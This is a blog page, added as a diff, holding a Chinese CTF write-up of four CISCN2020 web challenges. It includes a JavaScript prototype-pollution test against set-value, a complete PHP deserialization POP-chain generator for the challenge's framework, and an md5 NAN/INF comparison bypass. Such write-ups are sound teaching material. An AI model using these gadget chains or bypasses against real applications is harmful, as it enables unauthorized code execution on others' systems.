@@ -1,0 +1,632 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.0.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"blog.z3ratu1.cn","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="[CISCN2020 华东北赛区]web wp国赛结束写wp，输出很低，web都被神仙们日穿了，每个题都几百解，太牛逼了没保留题目源码，就凑合着写吧 easyphp用pntcl库开线程，子进程里面有命令执行，call_user_func_array($_GET[&#39;a&#39;], array($_GET[&#39;b&#39;]), false, true);父进程调用了pntcl_wai">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[CISCN2020 华东北赛区]web wp">
+<meta property="og:url" content="https://blog.z3ratu1.cn/[CISCN2020%20%E5%8D%8E%E4%B8%9C%E5%8C%97%E8%B5%9B%E5%8C%BA]web%20wp.html">
+<meta property="og:site_name" content="Z3ratu1&#39;s blog">
+<meta property="og:description" content="[CISCN2020 华东北赛区]web wp国赛结束写wp，输出很低，web都被神仙们日穿了，每个题都几百解，太牛逼了没保留题目源码，就凑合着写吧 easyphp用pntcl库开线程，子进程里面有命令执行，call_user_func_array($_GET[&#39;a&#39;], array($_GET[&#39;b&#39;]), false, true);父进程调用了pntcl_wai">
+<meta property="og:locale">
+<meta property="article:published_time" content="2020-08-21T03:04:48.000Z">
+<meta property="article:modified_time" content="2020-08-21T06:17:12.038Z">
+<meta property="article:author" content="Z3ratu1">
+<meta property="article:tag" content="wp">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://blog.z3ratu1.cn/[CISCN2020%20%E5%8D%8E%E4%B8%9C%E5%8C%97%E8%B5%9B%E5%8C%BA]web%20wp.html">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-Hans'
+  };
+</script>
+
+  <title>[CISCN2020 华东北赛区]web wp | Z3ratu1's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Z3ratu1's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">Welcome</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-links">
+
+    <a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>友链</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" placeholder="搜索..." spellcheck="false" type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+  <a href="https://github.com/Z3ratu1" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="external nofollow noopener noreferrer" target="_blank"><svg width="80" height="80" viewbox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"/><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"/><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"/></svg></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
+    <link itemprop="mainEntityOfPage" href="https://blog.z3ratu1.cn/[CISCN2020%20%E5%8D%8E%E4%B8%9C%E5%8C%97%E8%B5%9B%E5%8C%BA]web%20wp.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://q2.qlogo.cn/headimg_dl?dst_uin=1207039417&spec=160">
+      <meta itemprop="name" content="Z3ratu1">
+      <meta itemprop="description" content="与其感慨路难行，不如现在出发">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Z3ratu1's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          [CISCN2020 华东北赛区]web wp
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2020-08-21 11:04:48 / 修改时间：14:17:12" itemprop="dateCreated datePublished" datetime="2020-08-21T11:04:48+08:00">2020-08-21</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" itemprop="url" rel="index"><span itemprop="name">刷题记录</span></a>
+                </span>
+            </span>
+
+          
+            <span id="/%5BCISCN2020%20%E5%8D%8E%E4%B8%9C%E5%8C%97%E8%B5%9B%E5%8C%BA%5Dweb%20wp.html" class="post-meta-item leancloud_visitors" data-flag-title="[CISCN2020 华东北赛区]web wp" title="阅读次数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/%5BCISCN2020%20%E5%8D%8E%E4%B8%9C%E5%8C%97%E8%B5%9B%E5%8C%BA%5Dweb%20wp.html#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/%5BCISCN2020%20%E5%8D%8E%E4%B8%9C%E5%8C%97%E8%B5%9B%E5%8C%BA%5Dweb%20wp.html" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="CISCN2020-华东北赛区-web-wp"><a href="#CISCN2020-华东北赛区-web-wp" class="headerlink" title="[CISCN2020 华东北赛区]web wp"></a>[CISCN2020 华东北赛区]web wp</h1><p>国赛结束写wp，输出很低，web都被神仙们日穿了，每个题都几百解，太牛逼了<br>没保留题目源码，就凑合着写吧</p>
+<h2 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h2><p>用pntcl库开线程，子进程里面有命令执行，<code>call_user_func_array($_GET[&#39;a&#39;], array($_GET[&#39;b&#39;]), false, true);</code><br>父进程调用了pntcl_wait后调用pcntl_wifexited，子进程如果异常退出，父进程就会展示phpinfo，flag就在phpinfo里面，正则匹配$_GET[‘a’]不能有exec和pntcl之类的字段<br>使用call_user_func_array调用一个三个参数的函数，一开始fuzz能接受三个参数的函数fuzz了半天，最后意识到可以直接调用一个call_user_func，用call_user_func再去调用pntcl库的函数，不受正则影响，<br>师傅说子进程调用一个pntcl_wait就可以让父进程的pcntl_wifexited判断出问题，理论上感觉是子进程被挂起父进程wait结束发现子进程未正常退出吧？<br>在phpinfo中获取flag</p>
+<h2 id="littlegame"><a href="#littlegame" class="headerlink" title="littlegame"></a>littlegame</h2><p>js原型链污染，给flag靠Admin[key] &#x3D;&#x3D;&#x3D; password，key和password均可控，污染掉object给admin加一个属性就可以了，Privilege路由下面可以添加属性，key，value均可控，使用set-value第三方库进行合并操作，原型链污染点，大概看了一下合并（没看太懂，感觉就是简单地赋值合并）用如下代码进行尝试，发现原型链被污染，同理打一个payload就能获取flag了</p>
+<pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">let</span> k <span class="token operator">=</span> <span class="token string">"__proto__.aaa"</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">let</span> v <span class="token operator">=</span> <span class="token string">"111"</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">let</span> o <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"a"</span><span class="token punctuation">:</span><span class="token string">"a"</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
+<span class="token function">setFn</span><span class="token punctuation">(</span>o<span class="token punctuation">,</span>k<span class="token punctuation">,</span>v<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">let</span> b <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
+console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>b<span class="token punctuation">[</span><span class="token string">"aaa"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">// 111</span>
+</code></pre>
+<h3 id="trick"><a href="#trick" class="headerlink" title="trick"></a>trick</h3><p>看了师傅们的wp之后发现原来在给了package.json的时候可以运行一下npm audit直接查找当前第三方库存在什么样的问题，js类的题经常出现第三方库的漏洞，运行一下得到如下输出</p>
+<pre><code>$ npm audit
+
+                       === npm audit security report ===
+
+# Run  npm update set-value --depth 1  to resolve 1 vulnerability
+
+  High            Prototype Pollution
+
+  Package         set-value
+
+  Dependency of   set-value
+
+  Path            set-value
+
+  More info       https://npmjs.com/advisories/1012
+
+found 1 high severity vulnerability in 61 scanned packages
+  run `npm audit fix` to fix 1 of them.
+</code></pre>
+<p>直接告诉了有原型链污染，太高级了</p>
+<h2 id="babyunserialize"><a href="#babyunserialize" class="headerlink" title="babyunserialize"></a>babyunserialize</h2><p>WMCTF相同的框架，把WMCTF能查到的几个wp用到的pop链的函数都删了，自己写了一个可爱的正则去找$xxx-&gt;xxx($this-&gt;xxxx)的函数调用形式，在DB\Jig\Mapper里面找到了好几个类似函数，选一个update用，WS类是反序列化出来让autoload加载Agent类的，用Agent类的析构函数构造出pop链，array($MongoMapper,”update”)()这种形式的动态调用会调用MongoMapper类的update方法</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token keyword">namespace</span> <span class="token package">CLI</span><span class="token punctuation">{</span>
+    <span class="token keyword">class</span> <span class="token class-name">Agent</span>
+    <span class="token punctuation">{</span>
+        <span class="token keyword">protected</span> <span class="token variable">$server</span><span class="token punctuation">;</span>
+        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$server</span><span class="token punctuation">)</span>
+        <span class="token punctuation">{</span>
+            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">server</span><span class="token operator">=</span><span class="token variable">$server</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token keyword">class</span> <span class="token class-name">WS</span>
+    <span class="token punctuation">{</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+<span class="token keyword">namespace</span> <span class="token package">DB</span><span class="token punctuation">{</span>
+    <span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">Cursor</span>  <span class="token keyword">implements</span> <span class="token class-name"><span class="token punctuation">\</span>IteratorAggregate</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
+    <span class="token keyword">class</span> <span class="token class-name">Mongo</span> <span class="token punctuation">{</span>
+        <span class="token keyword">public</span> <span class="token variable">$events</span><span class="token punctuation">;</span>
+        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$events</span><span class="token punctuation">)</span>
+        <span class="token punctuation">{</span>
+            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">events</span><span class="token operator">=</span><span class="token variable">$events</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">namespace</span> <span class="token package">DB<span class="token punctuation">\</span>Mongo</span><span class="token punctuation">{</span>
+    <span class="token keyword">class</span> <span class="token class-name">Mapper</span> <span class="token keyword">extends</span> <span class="token class-name"><span class="token punctuation">\</span>DB<span class="token punctuation">\</span>Cursor</span> <span class="token punctuation">{</span>
+        <span class="token keyword">protected</span> <span class="token variable">$legacy</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>
+        <span class="token keyword">protected</span> <span class="token variable">$collection</span><span class="token punctuation">;</span>
+        <span class="token keyword">protected</span> <span class="token variable">$document</span><span class="token punctuation">;</span>
+        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$collection</span><span class="token punctuation">,</span><span class="token variable">$document</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">collection</span><span class="token operator">=</span><span class="token variable">$collection</span><span class="token punctuation">;</span>
+            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">document</span><span class="token operator">=</span><span class="token variable">$document</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+<span class="token keyword">namespace</span> <span class="token package">DB<span class="token punctuation">\</span>SQL</span><span class="token punctuation">{</span>
+    <span class="token keyword">class</span> <span class="token class-name">Mapper</span> <span class="token keyword">extends</span> <span class="token class-name"><span class="token punctuation">\</span>DB<span class="token punctuation">\</span>Cursor</span><span class="token punctuation">{</span>
+        <span class="token keyword">protected</span> <span class="token variable">$props</span><span class="token punctuation">;</span>
+        <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$props</span><span class="token punctuation">)</span>
+        <span class="token punctuation">{</span>
+            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">props</span> <span class="token operator">=</span> <span class="token variable">$props</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">namespace</span> <span class="token package">DB<span class="token punctuation">\</span>Jig</span><span class="token punctuation">{</span>
+    <span class="token keyword">class</span> <span class="token class-name">Mapper</span>
+    <span class="token punctuation">{</span>
+        <span class="token keyword">protected</span> <span class="token variable">$db</span><span class="token punctuation">;</span>
+        <span class="token keyword">protected</span> <span class="token variable">$file</span><span class="token punctuation">;</span>
+
+        <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$db</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span>
+        <span class="token punctuation">{</span>
+            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">db</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token punctuation">;</span>
+            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">namespace</span><span class="token punctuation">{</span>
+    <span class="token variable">$SQLMapper</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">DB<span class="token punctuation">\</span>SQL<span class="token punctuation">\</span>Mapper</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"read"</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">"phpinfo"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$MongoMapper</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">DB<span class="token punctuation">\</span>Jig<span class="token punctuation">\</span>Mapper</span><span class="token punctuation">(</span><span class="token variable">$SQLMapper</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$DBMongo</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">DB<span class="token punctuation">\</span>Mongo</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'disconnect'</span><span class="token operator">=</span><span class="token operator">></span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$MongoMapper</span><span class="token punctuation">,</span><span class="token string">"update"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$Agent</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">CLI<span class="token punctuation">\</span>Agent</span><span class="token punctuation">(</span><span class="token variable">$DBMongo</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$WS</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">CLI<span class="token punctuation">\</span>WS</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$WS</span><span class="token punctuation">,</span><span class="token variable">$Agent</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p>看了眼phpinfo，超级disable_function和open_basedir，想翻翻能不能翻出来什么奇怪的插件利用，结果突然翻到了flag，交了一下成了<br>这里明明__call函数使用的是call_user_func_array，但是实际上我试着传入两个参数的时候却一直报错只给了一个，不知道是怎么回事</p>
+<h2 id="easytrick"><a href="#easytrick" class="headerlink" title="easytrick"></a>easytrick</h2><p>想了一晚上没想出来，头都烂了</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token keyword">class</span> <span class="token class-name">trick</span><span class="token punctuation">{</span>
+    <span class="token keyword">public</span> <span class="token variable">$trick1</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token variable">$trick2</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">trick1</span> <span class="token operator">=</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">trick1</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">trick1</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">5</span> <span class="token operator">||</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">trick2</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">5</span><span class="token punctuation">)</span>
+        <span class="token punctuation">{</span>
+            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"你太长了"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">trick1</span> <span class="token operator">!==</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">trick2</span> <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">trick1</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">trick2</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">trick1</span> <span class="token operator">!=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">trick2</span><span class="token punctuation">)</span> 
+        <span class="token punctuation">{</span>
+            <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string">"/flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p>反序列化绕过md5，超级强md5判断，限制了长度的话就得是弱类型md5，问题就在于md5强类型相等后又需要trick弱类型不相等，并且两个trick中有一个会被强制类型转换为string，还有长度限制，太过分了</p>
+<p>比赛结束之后师傅和我说他想出来了，不过说实话还是感觉有点有违常识<br>md5函数只接受字符串，接受数组时会返回false，接受数字时会将其转换为十进制数字的字符串进行运算，但是相同的数字和字符串在弱类型上是相同的，因此这种最基本的方法自然不行<br>但是PHP中存在一些奇怪的数字，也许它们并不是数字？<br>NAN和INF，分别为非数字和无穷大，但是var_dump一下它们的数据类型却是double，那么在md5函数处理它们的时候，是将其直接转换为字符串”NAN”和字符串”INF”使用的，但是它们拥有特殊的性质，它们与任何数据类型（除了true）做强类型或弱类型比较均为false，甚至NAN&#x3D;&#x3D;NAN都是false，通过这个性质，可以令trick1&#x3D;”NAN”，trick2&#x3D;NAN，完成判断取得flag<br>贴一个讲这个的链接<br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://blog.csdn.net/weixin_43257005/article/details/106118623">https://blog.csdn.net/weixin_43257005/article/details/106118623</a></p>
+<p>如果昨天晚上就想出来就好了呜呜呜</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/wp/" rel="tag"># wp</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/%5BNPUCTF2020%5D%E9%AA%8C%E8%AF%81%F0%9F%90%8E.html" rel="prev" title="[NPUCTF2020]验证🐎">
+      <i class="fa fa-chevron-left"></i> [NPUCTF2020]验证🐎
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/%5B%E5%BC%BA%E7%BD%91%E6%9D%AF2020%5Dweb.html" rel="next" title="[强网杯2020] web">
+      [强网杯2020] web <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#CISCN2020-%E5%8D%8E%E4%B8%9C%E5%8C%97%E8%B5%9B%E5%8C%BA-web-wp"><span class="nav-number">1.</span> <span class="nav-text">[CISCN2020 华东北赛区]web wp</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#easyphp"><span class="nav-number">1.1.</span> <span class="nav-text">easyphp</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#littlegame"><span class="nav-number">1.2.</span> <span class="nav-text">littlegame</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#trick"><span class="nav-number">1.2.1.</span> <span class="nav-text">trick</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#babyunserialize"><span class="nav-number">1.3.</span> <span class="nav-text">babyunserialize</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#easytrick"><span class="nav-number">1.4.</span> <span class="nav-text">easytrick</span></a></li></ol></li></ol></div>
